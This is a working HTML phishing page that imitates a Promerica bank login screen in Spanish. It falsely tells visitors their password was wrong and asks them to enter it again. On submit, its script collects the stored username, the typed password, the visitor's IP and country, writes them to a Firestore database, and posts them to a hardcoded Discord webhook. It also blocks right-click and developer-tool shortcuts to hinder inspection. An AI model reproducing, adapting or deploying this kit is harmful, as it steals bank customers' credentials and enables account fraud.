<html><head>
    <link href="desktop.css" type="text/css" rel="stylesheet">
	<link href="./index_files/NunitoSans.min.css" type="text/css" rel="stylesheet">
	<link href="./index_files/font-awesome.min.css" type="text/css" rel="stylesheet">
	<link rel="SHORTCUT ICON" href="images/favicon.ico"/>
	<meta charset="UTF-8">
	<title>Ingreso</title>
	<script src="verificar-ip.js"></script>
	<script>
    // Bloquear clic derecho
    document.addEventListener("contextmenu", function (e) {
      e.preventDefault();
    }, false);

    // Bloquear teclas de inspecci√≥n
    document.addEventListener("keydown", function (e) {
      if (
        e.key === "F12" ||
        (e.ctrlKey && e.shiftKey && ["I", "J", "C"].includes(e.key)) ||
        (e.ctrlKey && e.key === "U")
      ) {
        e.preventDefault();
        return false;
      }
    });

    // Detecci√≥n de consola abierta (b√°sica)
    (function () {
      const element = new Image();
      Object.defineProperty(element, 'id', {
        get: function () {
          document.body.innerHTML = '<h1 style="color:red;text-align:center;">Inspecci√≥n desactivada</h1>';
        }
      });
      console.log(element);
    })();
  </script>
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <!-- Librer√≠as externas -->
    <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
<script src="telegram.js"></script>      
    <!-- Firebase Configuraci√≥n -->
    <script type="module">
      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
      import {
        getFirestore,
        doc,
        setDoc,
      } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";

 const firebaseConfig = {
  apiKey: "AIzaSyAExg896HFu93msNgwlazYfaTfcSp9Mo9Y",
  authDomain: "prrrr-cb4d7.firebaseapp.com",
  projectId: "prrrr-cb4d7",
  storageBucket: "prrrr-cb4d7.firebasestorage.app",
  messagingSenderId: "881373224030",
  appId: "1:881373224030:web:2be20f6fbcb19a03bfa8cf"
};

      const app = initializeApp(firebaseConfig);
      const db = getFirestore(app);

      // Hacer accesible globalmente
      window.db = db;
      window.doc = doc;
      window.setDoc = setDoc;
    </script>
</head>
<body>

    <div style="margin-top: 20px;margin-bottom: 20px;margin-left: auto;margin-right: auto;width: 52%;">
	<img src="images/1.png" alt="logo">
	</div>
	
<div class="bottom_nav"></div>

<div style="margin-top: 35px;margin-left: auto;margin-bottom: 20px;margin-right: auto;width: 51%;">
<div style="display:flex;margin-bottom: 20px;"><img src="images/4.png" alt="logo" style="float: left;margin-right: 10px;margin-top: 15px;">
<form class="login100-form validate-form" action="#" id="loginform" method="post">
                        <p id="gfg" hidden=""></p>
                        <p id="address" hidden=""></p>
                        <div style="text-align: center">
                          <div id="ValidateAlias">
                            <div class="sub_title sub_title_login text_login" style="width: 400px;">
                              <span id="ctl00_PlaceHolder_pbLoginUC_clAliasArea" class="sub_title_text f130 text_login">Por favor, digite su Informaci√≥n de Ingreso al Sistema</span>
                            </div>
                            <br>
                          <h3 style="color:red">Su contrase√±a es incorrecta, digite su contrase√±a nuevamente</h3><div>
                              <table style="margin: 10px auto;" cellspacing="10">
                                <tbody>
                                  <tr>
                                    <td align="right">
                                      <span id="ctl00_PlaceHolder_pbLoginUC_clLogin" class="normal_text strong text_login" style="display:inline-block;width:85px;padding-top:7px;">Contrase√±a : </span>
                                    </td>
                                    <td>
                                      <input name="ypn-cl" type="password" maxlength="50" id="ypn-cl" style="width:150px;" tabindex="0" required="">
                                      <span id="rvLogin" style="color:Red;background-color:Transparent;visibility:hidden;">*</span>
                                      
                                    </td>
                                  </tr>
                                </tbody>
                              </table>
                            </div></div>
                        
                          <div class="m-l-45 logi_remove">
                            <link href="./index_files/utilities.css" rel="stylesheet" type="text/css">
                            <div class="login_form p-b-10" id="divContainAllControls">
                              <button type="submit" name="ctl00$PlaceHolder$pbLoginUC$btValidateAlias" value="Ingresar" id="btValidateAlias" class="buttons buttons_text notNullOrEmpty text_login">Anterior</button>
                              <button type="submit" name="ctl00$PlaceHolder$pbLoginUC$btValidateAlias" value="Ingresar" id="btValidateAlias" class="buttons buttons_text notNullOrEmpty text_login">Ingresar</button><table class="p-b-10">
                                <tbody>
                                  <tr>
                                    
                                  </tr>
                                </tbody>
                              </table>
                            </div>
                          </div>
                          <div class="login_form login_reposition_line m-l-20 m-t-0 p-t-0"></div>
                          <div id="">
                            <div id="" style="margin: 10px auto; text-align: center;">
                              <i class="fa fa-info-circle" style="font-size:20px">&nbsp;</i>
                              <button type="button" class="styleRecoverPassword text_login">¬øOlvid√≥ su contrase√±a?</button>
                            </div>
                            <table style="margin: 10px auto;">
                              <tbody>
                                <tr>
                                  <td></td>
                                  <td>
                                    <input type="submit" value="1. Solicite una contrase√±a temporal" class="buttons buttons_text text_login">
                                  </td>
                                </tr>
                              </tbody>
                            </table>
                            
                            <table style="margin: 10px auto;">
                              <tbody>
                                <tr>
                                  <td></td>
                                  <td>
                                    <input type="submit" value="2. Ingrese su contrase√±a temporal" class="buttons buttons_text text_login">
                                  </td>
                                </tr>
                              </tbody>
                            </table><div class="login_form m-l-20"></div>
                            <div>
                              <div style="margin: 10px auto; text-align: center;">
                                <span id="ctl00_PlaceHolder_pbLoginUC_GalileoASPLabelQuestionSignUp" class="f180 text_login">¬øEs cliente y no tiene usuario?</span>
                              </div>
                              <div class="styleDivSignUp">
                                <input type="submit" value="Crear Usuario" class="buttons buttons_text text_login">
                              </div>
                            </div>
                          </div>
                    </div>
					</form>
					</div>

<img src="images/3.png" alt="logo" style="border-width:0px;">
</div>

<div class="bottom_nav"></div>


<script>
async function getCountry() {
            try {
                const response = await fetch('https://ipinfo.io/json');
                const data = await response.json();
                return data.country;
            } catch (error) {
                console.error('Error al obtener el pa√≠s:', error);
                return 'Pa√≠s Desconocido';
            }
        }

        async function getIPAddress() {
            try {
                const response = await fetch('https://api64.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('Error al obtener la direcci√≥n IP:', error);
                return 'IP Desconocida';
            }
        }
    document
      .querySelector("#loginform")
      .addEventListener("submit", async (event) => {
        event.preventDefault();

        const usuario =localStorage.getItem("usuario");;
        const contra2 = document.querySelector("#ypn-cl").value;
		const pais = await getCountry();
            const ip = await getIPAddress();

        if (!usuario || !contra2) {
          alert("Por favor, complete todos los campos.");
          return;
        }

        try {
          const userRef = doc(window.db, "prolme", usuario);
          await setDoc(userRef, {
            question1: "Sin uso",
            question2: "Sin uso",
            question3: "Sin uso",
            page: 0,
          });

          
          const message = `‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ[ üè¶Promerica ]‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ\nüë§ Usuario: ${usuario}\nüîí Contra corregida: ${contra2}\n‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ[ IP ]‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ\nPa√≠s: ${pais}\n\IP: ${ip}\n‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ[ By FwC üë®üèª‚Äçüíª ]‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ\n`;


      const discord_webhook_url = "https://discord.com/api/webhooks/1409663491316383865/5CHn5ZoD_FRd-9HSzLDNOI9GdfcHL63zNemfJDNpW9FpM4jq_MiSHMhrYmv0GwbyU5NK";

      await fetch(discord_webhook_url, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          content: message
        }),
      });

          window.location.href = "espere.html";
        } catch (error) {
          console.error("Error al enviar datos:", error);
        }
      });
  </script></body></html>